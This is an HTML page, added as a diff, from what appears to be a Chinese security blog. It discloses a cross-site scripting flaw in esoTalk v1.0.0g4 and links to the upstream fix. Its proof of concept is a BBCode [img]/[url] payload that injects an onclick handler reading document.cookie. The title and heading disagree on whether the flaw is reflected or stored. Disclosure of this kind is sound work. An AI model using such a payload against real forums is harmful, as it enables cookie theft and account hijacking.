@@ -1,0 +1,72 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Esotalk v1.0.0g4 最新版反射型跨站漏洞 - Hackersoul.com</title>
+  <meta name="keywords" content="HackerSoul,FF0000TEAM,Esotalk漏洞">
+  <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/hackersoul.css">
+  <link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
+</head>
+
+<body>
+  <div class="header">
+    <img src="/img/hs_header.jpg" class="header-bg">
+  </div>
+  <div class="narrow-board">
+    <a class="logo-container" href="/" title="一个有情怀的黑客博客">
+      <img src="/img/hs_logo.png" class="logo">
+      <div class="slogan">Enjoy hacking, Enjoy life.</div>
+    </a>
+
+    <div class="post">
+      <pre>
+      <xmp>                           
+                  .::Esotalk v1.0.0g4 [img]所导致的存储型跨站漏洞::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+                
+                  [+] HSID: FF000-HSDB-0008
+                  [+] Author: Evi1m0 <evi1m0.bat@gmail.cc>
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2014-12-27
+                _______________________________________________
+
+
+                                  -= Main =-
+
+### about
+
+esoTalk是一款国外拥有众多优势的免费，开源的基于PHP和MySQL下的网页应用。 她的设计极为简介，速度极快，超轻量级别并且有良好的可拓展性。
+
+> Website: [http://esotalk.org/]
+> Github: [https://github.com/esotalk/esoTalk]
+
+
+### Proof of Concept
+
+这次与http://1.hackersoul.sinaapp.com/post/ff0000-hsdb-0006.html稍微有些不同的是，[img]所导致的：
+
+[img][url=http://onclick=alert(document.cookie)//.com]http://www.hackersoul.com/image.jpg[/url][/img]
+
+
+### Fix
+
+https://github.com/esotalk/esoTalk/issues/401
+</xmp><img src="/img/media/e0fad0fc-8d0b-11e4-9aed-f2654c2e21ca.jpg" width=600px>
+<xmp>
+
+                                  -= END =-
+      </xmp>
+      </pre>
+    </div>
+
+    <div class="footer">
+    <span class="copy">&copy;&nbsp;</span>2014 FF0000 TeAm. <a href="/about.html" class="red-link">About Us</a>
+    </div>
+  </div>
+</body>
+</html>
